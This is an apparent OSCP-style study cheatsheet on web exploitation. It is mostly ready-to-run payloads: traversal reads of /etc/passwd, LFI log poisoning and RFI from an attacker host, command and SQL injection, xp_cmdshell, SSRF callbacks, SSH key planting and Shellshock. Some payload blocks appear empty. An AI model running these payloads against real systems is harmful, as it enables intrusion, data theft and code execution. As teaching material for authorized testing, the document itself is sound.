# Web Exploitation Cheatsheet [← Cheatsheet index](README.md) · [Map the application first](web-mapping.md) · [Stage 03 procedures](../reference/03-initial-access/README.md) · [Mechanics](../notes/Master_Notes.md#web-behavior-to-access) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../notes/methods/web-exploitation.md) > **Rule:** preserve a valid request, change one thing, compare a control, and name only the primitive proved. Use only on assigned, authorized targets. ## Primitive ladder ```text controlled input -> changed server behavior -> read/write/execute/auth/authz primitive -> useful artifact/effect -> independently verified access -> re-enumerate ``` | Result | What it proves | Next question | | --- | --- | --- | | Recognizable file content | File read | Does it disclose source, config, users, keys or credentials? | | Retrievable uploaded marker | File write/storage | Where is it stored, renamed, served and handled? | | Target command output | OS execution | Which identity/environment, and how is a reliable session obtained? | | Query true/false difference | Query influence | Which DBMS and extraction mechanism? | | Another user's data/action | Authorization failure | Which objects, methods and roles are affected? | | JavaScript in target origin | Browser execution | Which relevant victim and privileged action exist? | ## File paths and uploads Traversal/file read: ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH ``` PHP source disclosure: ```bash curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php printf '%s' 'BASE64_DATA' | base64 -d ``` LFI/log execution chain: ```bash curl -sk -A '' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Benign upload first: ```bash printf '%s\n' 'UPLOAD_CANARY_7F31' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;filename=probe.txt;type=text/plain' http://TARGET:PORT/upload ``` > Verify acceptance, server-side name, retrieval URL, exact bytes and response type. Only then test handler-specific execution. Full variants: [web file handling](../reference/03-initial-access/02-web-file-handling.md). ## Command injection > **Run/context:** replay requests from the testing workstation with the application's working host, session and parameter; injected commands execute server-side if the hypothesis is confirmed. **Decide:** reflection or one slow response is inconclusive. After reproducible execution, select a [session and listener](shells-payloads.md#choose-access); confirmed execution with no callback needs [route diagnosis](shells-payloads.md#callback-ladder), not another injection assumption. Visible output: ```bash curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH ``` Blind timing: ```bash curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH ``` > Repeat controls; reflection is not execution and one slow request is not proof. After execution, verify `id`/`whoami`, hostname and working directory, then use Block 7. Full procedure: [command and SQL injection](../reference/03-initial-access/03-command-and-sql-injection.md). ## Manual SQL injection Detect with controlled pairs: ```text VALUE' # parser/error clue VALUE' AND '1'='1 # true VALUE' AND '1'='2 # false ``` UNION shape and displayed column: ```text ' ORDER BY 1-- - ' ORDER BY 2-- - ' UNION SELECT NULL,NULL,NULL-- - ' UNION SELECT NULL,'MARKER_7F31',NULL-- - ``` Fingerprint only after injection proof: ```text MySQL/PostgreSQL: ' UNION SELECT NULL,version(),NULL-- - MSSQL: ' UNION SELECT NULL,@@version,NULL-- - ``` Boolean/time examples: ```text ' AND SUBSTRING((SELECT version()),1,1)='P'-- - MySQL: ' AND IF(1=1,SLEEP(5),0)-- - PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'-- ``` Out-of-band proof candidate after in-band/blind methods fail: ```sql SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE())); ``` > Use only a controlled uniquely labelled listener/domain and no sensitive data. A callback proves a server-side request, not full extraction. Database-to-OS execution/OOB requires separate DBMS, privilege, path/feature and egress conditions. SQLmap is prohibited by the current OSCP+ exam guide. ## Access control and XSS IDOR comparison: ```http GET /api/objects/OBJECT_B HTTP/1.1 Host: DOMAIN Authorization: Bearer USER_A_TOKEN ``` Keep A's session and change only A's object reference to B's. Compare owned, unowned and nonexistent objects; verify read/write/delete effects separately. Mass assignment candidate: ```bash curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD","role":"administrator"}' http://TARGET:PORT/api/v1/register ``` Verify through a separate login and administrator-only action. XSS context proof: ```html ``` > Confirm reflection/storage/DOM sink, target origin and relevant viewer. Browser execution is not a server shell; its value comes from a victim's same-origin actions. Full procedure: [access control and XSS](../reference/03-initial-access/04-access-control-and-xss.md). ## WordPress ```bash curl -sk https://HOSTNAME/wp-json/ | head curl -sk https://HOSTNAME/wp-login.php -o wp-login.html wpscan --url https://HOSTNAME/ --disable-tls-checks --enumerate vp,vt,u --plugins-detection mixed -o wpscan.txt ``` Verify active core/plugin/theme version and vulnerable configuration manually. After login, map the actual role/capabilities; upload, editor, plugin-install and user-management rights are distinct. ## SSRF ```bash # Kali listener python3 -m http.server LPORT --bind 0.0.0.0 # hypothetical replay curl -sk 'https://HOSTNAME/fetch?url=http://LHOST:LPORT/ssrf-marker' ``` After a controlled callback proves server-side fetching: ```bash curl -sk 'https://HOSTNAME/fetch?url=http://127.0.0.1:PORT/' curl -sk -X POST https://HOSTNAME/fetch --data-urlencode 'url=http://127.0.0.1:PORT/' ``` Compare known-open/known-closed destinations. Browser fetch/reflection/redirect is not SSRF; internal content read is not execution. ## Conditional parser and template primitives Open these only when the mapped request or source supplies the stated parser/framework condition. They are manual, bounded proofs—not automated exploitation.
SSTI — prove evaluation before choosing an engine-specific primitive ```bash curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH ``` > Repeatable computed output supports template evaluation; `49` alone does not identify the engine. Confirm engine/version and exposed objects before file or command primitives. [Full interpretation](../reference/03-initial-access/03-command-and-sql-injection.md#ssti--prove-template-evaluation-then-identify-the-engine).
XXE — preserve a working XML request and prove parser-side file read ```xml ]> &probe; ``` ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' \ --data-binary @xxe.xml http://TARGET:PORT/PATH ``` > Recognizable file content in the parsed field proves read access; reflected XML does not. DTD rejection or unresolved entities rules out only that parser/configuration path. [XInclude and blind boundaries](../reference/03-initial-access/03-command-and-sql-injection.md#xxe--test-the-xml-parser-and-file-read-result).
NoSQL operator injection — compare object-valued input with string controls ```bash curl -i -c cookies.txt -H 'Content-Type: application/json' \ --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN curl -i -c cookies.txt --data-urlencode 'username=USER' \ --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN ``` > Confirm the resulting identity through a protected route. A `200`, cookie or changed error is not authentication by itself. Use only where the framework parses nested objects/operators. [Full controls](../reference/03-initial-access/03-command-and-sql-injection.md#nosql-operator-injection--separate-json-objects-from-strings).
PHP deserialization — match the gadget chain to installed dependencies ```bash phpggc -l phpggc -i Monolog/RCE1 phpggc -b Monolog/RCE1 system id > payload.b64 ``` > Use only after source/request evidence proves unsafe `unserialize()` and the required classes/version are loaded. Base64 is transport, not a bypass; generated bytes are not execution proof. [Full prerequisites](../reference/03-initial-access/03-command-and-sql-injection.md#php-deserialization--match-the-gadget-to-installed-dependencies).
Unsafe YAML construction — require an unsafe Python loader ```yaml !!python/object/apply:os.system ["id"] ``` > This applies only when controlled YAML reaches an unsafe PyYAML loader. JSON, `yaml.safe_load()` and a mere `.yml` filename do not supply the prerequisite. [Full failure cues](../reference/03-initial-access/03-command-and-sql-injection.md#unsafe-yaml-construction--distinguish-loading-from-safe-parsing).
Shellshock — only a confirmed CGI-to-vulnerable-Bash chain ```bash curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \ http://TARGET:PORT/cgi-bin/SCRIPT ``` > An attributable UID in the CGI response supports execution; reflected header text does not. This is not a generic payload for PHP/Java routes. [Full component checks](../reference/03-initial-access/03-command-and-sql-injection.md#shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash).
## Fast failure routing | Symptom | Decision | | --- | --- | | `200` with normal template | No primitive yet; inspect stable content, normalization and exact parameter | | Upload returns success but no file | Find final name/path or record as inconclusive | | Uploaded code downloads/displays | Write/retrieval only; no executable handler | | Quote causes generic `500` | Compare true/false; distinguish DB/app/WAF error | | `UNION` errors | Recheck context, column count, types and comments | | Timing is noisy | Repeat control/test and lengthen only within safe lab bounds | | Object change gives same user's data | Authorization held in that context | | XSS runs only for tester | Self/reflected path lacks a useful viewer/delivery chain | ## Handoffs ```text credential/key/token -> Block 5 product/version/CVE -> Block 6 verified command execution -> Block 7 useful application role -> authenticated Block 3 remap server-side internal reachability -> enumerate only proved destination/route new host/address/listener/route -> Block 1 ``` ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Turn application weaknesses into access
Find: Read files through directory traversal Find real download/preview/export requests in the behavior map; inspect which filename/path values the normal request accepts. ```bash curl -sk -b cookies.txt -D - 'http://TARGET:PORT/download?file=report.pdf' ``` > **Recognize:** An application-controlled file selection is the cue to test path confinement; it is not yet arbitrary read. > **Validate next:** Request a known target-platform file through the real file parameter/path and compare with the normal response. Require recognizable file contents; a reflected filename, error or status change is not a read. [Read files through directory traversal](../notes/methods/web-exploitation.md#web-traversal).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Untrusted path reaches a filesystem read outside its intended directory; process identity can read the requested file Linux proof: ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH ``` Windows proof: ```bash curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH ``` > **Decisive output:** recognizable contents of the requested target file. `200 OK`, a changed template or a filename reflected in an error is not proof.
Variant — traversal occurs in the URL path ```bash curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' ``` `--path-as-is` prevents curl from collapsing `..` before sending the request.
Variant — basic normalization/filter tests ```text ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd ``` Try these only after a plain baseline. Preserve the exact decoding layer that accepted the value.
> **Next:** use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered authentication material to Block 5 with its source and identity context. > **Verify:** Require recognizable target-file content and controls that exclude a reflected input or static error page. > **If it fails:** An empty/denied response can be path depth, normalization or file permissions. If only file read is proven, follow credentials instead of assuming code execution.
Find: Disclose PHP source through an inclusion wrapper Inspect the normal page selector, PHP technology evidence and any readable source/configuration clue obtained during mapping. ```bash curl -sk -D - 'http://TARGET:PORT/index.php?page=about' ``` > **Recognize:** An include-related error suggests an evaluating PHP sink, unlike an ordinary file-download function. > **Validate next:** Verify that the actual sink accepts a filter wrapper and returns decodable target source; errors alone do not prove it. [Disclose PHP source through an inclusion wrapper](../notes/methods/web-exploitation.md#web-php-source).
Find: Turn controlled local file content into inclusion execution After a file/include primitive is demonstrated, use readable configuration to locate the actual log and check whether your harmless request marker is present. ```bash curl -sk -A 'LOG_CANARY' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/PATH/TO/access.log' http://TARGET:PORT/index.php ``` > **Recognize:** The include/read identity can reach a log containing your controlled input; evaluation and payload preservation still need proof. > **Validate next:** Separate raw file read from interpreter evaluation, confirm exact file path and encoding, then a minimal command effect. [Turn controlled local file content into inclusion execution](../notes/methods/web-exploitation.md#web-lfi-log).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Controlled content survives logging; inclusion identity can read it; interpreter evaluates it; requested command facility is available ```bash curl -sk -A '' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` > **Prerequisites:** the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates PHP and the payload survives encoding. On Windows/XAMPP, investigate application-specific paths such as `C:\xampp\apache\logs\access.log`. > **Decisive output:** the unique command output and target execution identity. If code appears as text, only read/inclusion is proven.
Variant — PHP data wrapper ```bash PAYLOAD=$(printf '%s' '' | base64 -w0) curl -skG --data-urlencode "page=data://text/plain;base64,$PAYLOAD" --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires URL inclusion in the sink and PHP `allow_url_include=On`; it is disabled by default in current PHP configurations.
Variant — remote file inclusion ```bash python3 -m http.server TRANSFER_PORT --bind LHOST curl -skG --data-urlencode 'page=http://LHOST:TRANSFER_PORT/check.php' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires remote URL inclusion, a compatible interpreter and target-to-`LHOST:TRANSFER_PORT` reachability. An absent HTTP request is inconclusive until reachability and filtering are separated.
> **Verify:** Require command-specific output distinct from the logged payload and record hostname/identity. > **If it fails:** Missing log access, escaping or plain-text reading breaks this chain. Data/RFI variants are viable only when their explicitly listed wrapper/configuration and return-route conditions hold.
Find: Establish upload acceptance, storage and retrieval Browse normal attachment/import/profile functions and capture one accepted harmless multipart upload with its returned identifier. ```bash printf '%s\n' 'UPLOAD_CANARY' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;type=text/plain' http://TARGET:PORT/upload ``` > **Recognize:** The real upload route, field and response identify a storage/retrieval candidate. > **Validate next:** Retrieve the canary independently; establish stored bytes, final name and account/context before testing execution. [Establish upload acceptance, storage and retrieval](../notes/methods/web-exploitation.md#web-upload).
Find: Execute an uploaded file through a compatible handler Begin with a verified retrievable upload; inspect final naming, response handling and evidence of the application's actual interpreter. ```bash curl -sk -i http://TARGET:PORT/uploads/FILE ``` > **Recognize:** A retrievable script may be inert. The interesting detail is how the final location is handled, not acceptance of a script extension. > **Validate next:** Retrieve the exact stored upload and request it through the candidate server-side handler. Verify an attributable identity marker from that request; uploaded bytes or a 200 response alone do not prove execution. [Execute an uploaded file through a compatible handler](../notes/methods/web-exploitation.md#web-upload-exec).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Controlled executable content survives validation; final storage/URL is handled by the compatible interpreter; process execution is permitted PHP example, only after PHP handler evidence: ```bash printf '%s\n' '' > check.php curl -sk -b cookies.txt -F 'file=@check.php;filename=check.php;type=application/x-php' http://TARGET:PORT/upload curl -skG --data-urlencode 'cmd=id' http://TARGET:PORT/uploads/check.php ``` > **Decisive output:** target command output. A successful upload that downloads, displays source or returns inert text proves write/retrieval only.
Variants — isolate validation layers in Burp Repeater Test one property at a time: - bypass client-side checks by replaying the raw multipart request; - filename case or alternate extension only when the observed server maps it to the interpreter; - multipart `Content-Type` independently from filename and content; - magic bytes only when server behavior shows content inspection; - double extensions/trailing characters only when normalization evidence supports them; - server rename and final response `Content-Type`. ```bash curl -sk -b cookies.txt -F 'file=@check.php;filename=check.pHP;type=image/jpeg' http://TARGET:PORT/upload ``` Changing MIME type is a test of validation, not proof of executable handling.
> **Verify:** Require target command output and identity; acceptance, source download and a 200 status are weaker results. > **If it fails:** Check extension mapping, server rename, handler location and content transformation. Do not treat every upload-filter bypass as a shell.
Find: Use upload path control to reach a useful consumer Inspect an accepted upload's raw multipart filename/path fields and compare the returned destination for one harmless unique filename. ```bash curl -sk -b cookies.txt -F 'file=@probe.txt;filename=../UNIQUE_CANARY.txt;type=text/plain' http://TARGET:PORT/upload ``` > **Recognize:** An independently located out-of-directory canary is path-control evidence; it does not establish access to another user's key directory. > **Validate next:** Confirm filesystem identity, exact destination semantics, write permissions and a useful consumer/trigger. [Use upload path control to reach a useful consumer](../notes/methods/web-exploitation.md#web-upload-path).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Destination path control survives normalization; write identity can reach the destination; a known consumer accepts the resulting file First use a harmless unique filename outside the normal upload directory and verify it through a separate read/listing primitive. Do not overwrite an existing file as a detection test.
Lab-only variant — controlled SSH public-key placement ```bash ssh-keygen -t ed25519 -f ./web_upload_key -N '' cp ./web_upload_key.pub ./authorized_keys curl -sk -b cookies.txt -F 'file=@authorized_keys;filename=../../../../home/USER/.ssh/authorized_keys' http://TARGET:PORT/upload ssh -i ./web_upload_key -p SSH_PORT USER@TARGET ``` Use only in a disposable authorized lab after confirming the exact user/home, SSH service, web write identity, destination semantics and overwrite impact. Failure can mean path normalization, permission denial, SSH policy or a different user—not necessarily that upload path control is absent.
> **Verify:** Independently prove destination and bytes before claiming a privileged consumer or accepted key. > **If it fails:** Normalization, permissions and consumer policy are separate failure points; preserve the proven write without overstating its effect.
Find: Prove visible or blind operating-system command injection Find a mapped feature that runs a system-like operation, inspect its request, and compare a normal value with one bounded command-dependent probe. ```bash curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH ``` > **Recognize:** The function and output suggest an OS utility consumer; the parameter's parsing boundary is the candidate. > **Validate next:** Replay the real request with a benign id/whoami marker and a normal control. Require attributable command output, or repeat bounded timing/control tests for a blind sink. Reflected text or one slow response is not execution. [Prove visible or blind operating-system command injection](../notes/methods/web-exploitation.md#web-command).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Input reaches command execution with an exploitable parsing boundary; process identity/runtime can perform the selected proof ##### Visible-output baseline Start with a benign identity marker appropriate to the inferred operating system: ```bash curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH ``` > **Decisive output:** command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution.
Variants — separators, quoting and POST bodies Test only the forms compatible with the observed command and platform: ```text 127.0.0.1; id 127.0.0.1 && id 127.0.0.1 | id 127.0.0.1%0aid ``` ```bash curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH ``` For Windows command contexts, use an observed `cmd.exe` or PowerShell boundary before choosing syntax: ```text 127.0.0.1 & whoami 127.0.0.1 | whoami ```
##### Blind timing proof Repeat a control and a bounded-delay request several times: ```bash curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH ``` Windows candidate after platform evidence: ```text 127.0.0.1 & timeout /t 5 ``` > **Decisive output:** a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive. ##### After command execution ```text Linux: id; hostname; pwd Windows: whoami; hostname; cd ``` Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell. > **Verify:** Use reproducible command-specific output or controlled timing comparisons; a server error alone does not prove execution. > **If it fails:** A callback failure does not disprove already-confirmed execution. Diagnose quoting/interpreter/route at the relevant layer.
Find: Establish SQL query influence and DBMS context Map a data lookup/login/search request, preserve its session and compare one changed input with normal/invalid controls. ```bash curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH curl -skG --data-urlencode "PARAM=NORMAL_VALUE'" http://TARGET:PORT/PATH ``` > **Recognize:** A database-looking error ties the input to a possible query parser; it is a hypothesis until controlled predicates affect query behavior. > **Validate next:** Identify quote/query context and repeat true/false comparisons; establish the DBMS before DB-specific payloads. [Establish SQL query influence and DBMS context](../notes/methods/web-exploitation.md#sql-influence).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. Input reaches a SQL query; a valid request and stable response baseline exist > **Exam boundary:** the current OSCP+ exam guide prohibits SQLmap and other automatic exploitation tools. The following procedure is manual. Recheck the current guide before an exam. ##### 1. Establish query influence Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition: ```text VALUE VALUE' VALUE' AND '1'='1 VALUE' AND '1'='2 ``` For a numeric context: ```text 1 1 AND 1=1 1 AND 1=2 ``` > **Evidence:** a database error, stable true/false response difference, or repeatable database-specific delay. An isolated `500`, WAF block or generic application error is not enough. ##### 2. Authentication-bypass candidate In an authorized disposable lab, preserve the application's quoting and comment syntax: ```text ' OR 1=1-- - administrator'-- - ``` > **Verification:** identify the resulting account/session and perform a separate authorized request. A redirect or welcome string alone can be misleading. ##### 3. Determine UNION shape First establish column count: ```text ' ORDER BY 1-- - ' ORDER BY 2-- - ' ORDER BY 3-- - ``` Or increment `NULL` columns until the query succeeds: ```text ' UNION SELECT NULL-- - ' UNION SELECT NULL,NULL-- - ' UNION SELECT NULL,NULL,NULL-- - ``` Then find a displayed text-compatible column: ```text ' UNION SELECT NULL,'MARKER_7F31',NULL-- - ``` > **Decisive output:** the marker appears in a response location controlled by the injected row. Match the exact column count and data types. ##### 4. Extract only after fingerprinting the DBMS ```text MySQL: ' UNION SELECT NULL,version(),NULL-- - PostgreSQL: ' UNION SELECT NULL,version(),NULL-- - MSSQL: ' UNION SELECT NULL,@@version,NULL-- - ``` Use the confirmed DBMS's catalog and concatenation syntax rather than cycling unrelated payloads. Keep each extraction request reproducible in Repeater. ##### 5. Boolean- or time-blind extraction Choose a stable page marker or content length for true/false comparisons: ```text ' AND SUBSTRING((SELECT version()),1,1)='P'-- - ' AND SUBSTRING((SELECT version()),1,1)='X'-- - ``` DBMS-specific time proofs: ```text MySQL: ' AND IF(1=1,SLEEP(5),0)-- - PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'-- ``` > Repeat controls. Time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently. > **Verify:** Require repeatable, query-dependent behavior and preserve request/session controls; identify DBMS evidence before DB-specific payloads. > **If it fails:** Generic errors, WAF responses, caching and broken sessions can imitate SQLi. Rebuild the valid request and test a discriminating control.
Find: Test a SQL-backed authentication bypass Use the actual login request already shown to influence SQL, including its real username/password fields and invalid-login control. ```bash curl -sk -i --data-urlencode 'username=USER' --data-urlencode 'password=INVALID_CONTROL' http://TARGET:PORT/login ``` > **Recognize:** The authentication decision may depend on the injectable query result, creating a bypass candidate. > **Validate next:** Verify query shape and post-query checks, then independently confirm the resulting session identity/protected action. [Test a SQL-backed authentication bypass](../notes/methods/web-exploitation.md#sql-auth).
Find: Extract data through UNION and visible SQL results After controlled SELECT influence, inspect which database result fields are rendered and test the documented column-shape controls. ```bash curl -skG --data-urlencode "PARAM=VALUE' ORDER BY 1-- -" http://TARGET:PORT/PATH ``` > **Recognize:** A predictable shape boundary in a rendered SELECT suggests a UNION channel, subject to column types and reflection. > **Validate next:** Confirm column count/types and a query-generated visible marker before extracting selected metadata. [Extract data through UNION and visible SQL results](../notes/methods/web-exploitation.md#sql-union).
Find: Infer SQL data through boolean or time-based differences Start from proven query influence and compare stable true/false controls or repeated baseline timings when no rows are rendered. ```bash curl -sk -o /dev/null -w '%{time_total}\n' --get --data-urlencode 'PARAM=BASELINE_VALUE' http://TARGET:PORT/PATH ``` > **Recognize:** A repeatable predicate-dependent difference provides an inference channel even without visible rows. > **Validate next:** Validate controls using a known predicate and separate caching, network load and backend delay. [Infer SQL data through boolean or time-based differences](../notes/methods/web-exploitation.md#sql-blind).
Find: Convert database rights into a file or operating-system effect From the authenticated/injected database context inspect the real role, grants, enabled facilities and server identity before selecting any file/command transition. ```sql SELECT SYSTEM_USER, ORIGINAL_LOGIN(); SELECT IS_SRVROLEMEMBER('sysadmin'); ``` > **Recognize:** Database administration is a useful enabling clue, but it is not an observed OS shell or a domain privilege level. > **Validate next:** Match the DBMS-specific facility, configuration, OS permission and consumer; verify a minimal actual OS effect. [Convert database rights into a file or operating-system effect](../notes/methods/web-exploitation.md#sql-os).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. DBMS-specific privilege and enabled facility; OS service identity, writable/readable destination and a compatible consumer This is a new transition, not an automatic consequence of SQL injection. Verify the DBMS identity, database role, feature state, filesystem permissions and path or egress assumptions first.
MSSQL — xp_cmdshell when privilege and policy allow ```sql EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; ``` Requires sufficient server privilege; enabling it changes server configuration. Prefer a direct proof when it is already enabled. Verify the Windows service identity returned by `whoami`.
PostgreSQL — COPY PROGRAM when role and version allow ```sql DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output; ``` Requires a superuser or a role such as `pg_execute_server_program`; the command runs under the database service account.
MySQL/MariaDB — file write as a separate primitive ```sql SELECT '' INTO OUTFILE '/CONFIRMED/WEBROOT/check.php'; ``` Requires `FILE` privilege, a permitted `secure_file_priv` destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven.
> **Verify:** Verify the resulting host and operating-system identity, or independently verify written/read bytes. > **If it fails:** Denied DB facility, secure file directory or OS permissions breaks the proposed transition. Retain useful data access and choose another enabled route.
Find: Cross an object-ownership boundary Capture object requests for two authorized study accounts and associate each object ID with its owner before making a cross-account comparison. ```bash curl -sk -b lower-role.cookies http://TARGET:PORT/api/objects/OBJECT_ID ``` > **Recognize:** A private object owned by another controlled account is returned to the lower-context requester. > **Validate next:** Confirm intended sharing rules, account isolation and actual object content/change with valid controls. [Cross an object-ownership boundary](../notes/methods/web-exploitation.md#web-idor).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. The server accepts a lower-privilege identity's request for an object it should not access Use two controlled lab identities and one object owned by each: ```http GET /api/orders/OBJECT_B HTTP/1.1 Host: DOMAIN Authorization: Bearer USER_A_TOKEN ``` 1. Save user A's successful request for object A. 2. Change only the path/query/body object reference to object B. 3. Keep A's token. 4. Verify disclosure or the intended update/delete effect against B's object. > **Decisive output:** data or a state change belonging to B under A's context. A different error or `200` wrapper is not enough. > **Verify:** Verify object ownership, requesting identity and the actual unauthorized effect. > **If it fails:** A 200 response may be a generic page or public object. Validate ownership and intended access before drawing a conclusion.
Find: Cross role, function or session authorization boundaries Compare ordinary-user and authorized-administrator requests for a real protected function, preserving method, CSRF/session and arguments. ```bash curl -sk -i -b lower-role.cookies http://TARGET:PORT/ADMIN_PATH ``` > **Recognize:** A visible administrative route is a lead; only a server-side protected effect establishes the missing role check. > **Validate next:** Replay a valid authorized action under the lower context and independently inspect its permitted effect. [Cross role, function or session authorization boundaries](../notes/methods/web-exploitation.md#web-authz).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. The lower-role identity can invoke a protected server-side action without its required authorization Replay the same operation as: ```text anonymous -> ordinary user -> alternate ordinary user -> administrator ``` Compare UI and API paths, then test the legitimate method variants suggested by captured traffic or documentation. ```bash curl -ski -b user-a.cookies http://TARGET:PORT/admin/PATH curl -ski -X POST -b user-a.cookies -H 'Content-Type: application/json' -d '{"action":"EXPECTED_ACTION"}' http://TARGET:PORT/api/admin/PATH ``` > **Failure cue:** a route name containing `admin` does not establish a bypass. Verify a privileged read or action under the lower-privileged identity. > **Verify:** Prove the protected effect and requesting identity; a rendered administrative page without action rights is a weaker finding. > **If it fails:** Expired cookies, CSRF checks and wrong methods are request-state failures; preserve the valid baseline before assessing authorization.
Find: Modify a protected property through excessive writable fields Read a legitimate API profile and inspect its schema/update request for security-sensitive properties not exposed by the user interface. ```bash curl -sk -b cookies.txt http://TARGET:PORT/api/PROFILE_PATH ``` > **Recognize:** Returned owner/role fields identify properties to investigate; they are not evidence that the server binds them on update. > **Validate next:** Check accepted writable fields, independent persistence and a resulting permission change. [Modify a protected property through excessive writable fields](../notes/methods/web-exploitation.md#web-mass-assignment).
Commands and use-case variants > **Need:** A reproducible application request and a controlled input or access-context comparison. The server binds an untrusted property to a persistent security-relevant field without checking permission Start with a valid captured registration/update request and add one server-owned property: ```bash curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD","role":"administrator"}' http://TARGET:PORT/api/v1/register ``` > **Decisive output:** authenticate as the new/updated identity and perform an administrator-only action. An echoed or stored `role` field may be ignored by authorization logic.
Variant — method mismatch reveals a valid route ```bash curl -ski http://TARGET:PORT/api/v1/users/USER/password curl -ski -X OPTIONS http://TARGET:PORT/api/v1/users/USER/password curl -ski -X PUT -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"password":"NEW_PASSWORD"}' http://TARGET:PORT/api/v1/users/USER/password ``` Use PUT/PATCH only when a `405`, `Allow` header, documentation or JavaScript behavior supports it. Verify the new credential through a separate login.
> **Verify:** Independently reread the object and demonstrate the resulting permitted action under the same account. > **If it fails:** Ignored/filtered fields disprove that specific assignment route; investigate another property or function boundary.
Find: Execute browser code and validate a useful same-origin action Locate a normal reflected/stored input and inspect its final HTML/DOM context in the browser rather than treating raw reflection as execution. ```bash curl -skG --data-urlencode 'PARAM=UNIQUE_MARKER' http://TARGET:PORT/PATH ``` > **Recognize:** The output context and escaping determine whether browser execution is plausible; the second form is escaped text. > **Validate next:** Verify the actual browser sink/execution, victim origin/role, required interaction and useful authorized same-origin action. [Execute browser code and validate a useful same-origin action](../notes/methods/web-exploitation.md#web-xss).
